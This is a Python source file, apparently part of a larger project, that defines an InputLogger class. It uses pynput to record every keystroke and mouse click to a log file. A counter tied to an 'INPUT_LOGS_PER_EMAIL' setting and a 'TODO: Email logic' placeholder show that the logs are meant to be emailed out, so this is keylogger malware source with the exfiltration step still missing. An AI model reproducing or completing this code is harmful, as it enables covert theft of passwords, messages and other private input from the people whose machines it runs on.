import sys
from os.path import join
from datetime import datetime
from pynput.keyboard import Listener as KeyboardListener, Key
from pynput.mouse import Listener as MouseListener, Button
from config import LOGS_DIRECTORY_PATH, INPUT_LOGS_PER_EMAIL
from utils.utils import log, handle_counter


class InputLogger:
    def __init__(self):
        self.log_file_path = join(LOGS_DIRECTORY_PATH, "input.txt") if LOGS_DIRECTORY_PATH else "input.txt"
        self.error_file_path = join(LOGS_DIRECTORY_PATH, "errors.txt") if LOGS_DIRECTORY_PATH else "errors.txt"
        self.counter = 0
        self.counter_max = INPUT_LOGS_PER_EMAIL
        self.running = True

    def on_keyboard_press(self, key: Key):
        log(f"KEYBOARD PRESSED {str(key)}", self.log_file_path)
        self.handle_counter()
        return self.running

    def on_keyboard_release(self, key: Key):
        log(f"KEYBOARD RELEASED {str(key)}", self.log_file_path)
        self.handle_counter()
        return self.running

    def on_mouse_click(self, x: int, y: int, button: Button, pressed: bool):
        action = "PRESSED" if pressed else "RELEASED"
        log(f"MOUSE {action} {str(button)} AT {x}, {y}", self.log_file_path)
        self.handle_counter()
        return self.running

    def handle_counter(self):
        self.counter += 1
        if handle_counter(self.counter, self.counter_max):
            pass  # TODO: Email logic

    def run(self):
        try:
            with KeyboardListener(on_press=self.on_keyboard_press, on_release=self.on_keyboard_release) as keyboard_listener, MouseListener(on_click=self.on_mouse_click) as mouse_listener:
                keyboard_listener.join()
                mouse_listener.join()
        except KeyboardInterrupt:
            self.running = False
        except Exception as e:
            self.running = False
            self.log_error("ERROR WHILE LOGGING INPUT:", e)

    def log_error(self, message: str, exception: Exception) -> None:
        log(message, self.error_file_path)
        log(str(exception), self.error_file_path)


def main():
    input_logger = InputLogger()
    try:
        input_logger.run()
    except Exception:
        print("An error occurred while logging input.")
        print(f"See full error here: {input_logger.error_file_path}")
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
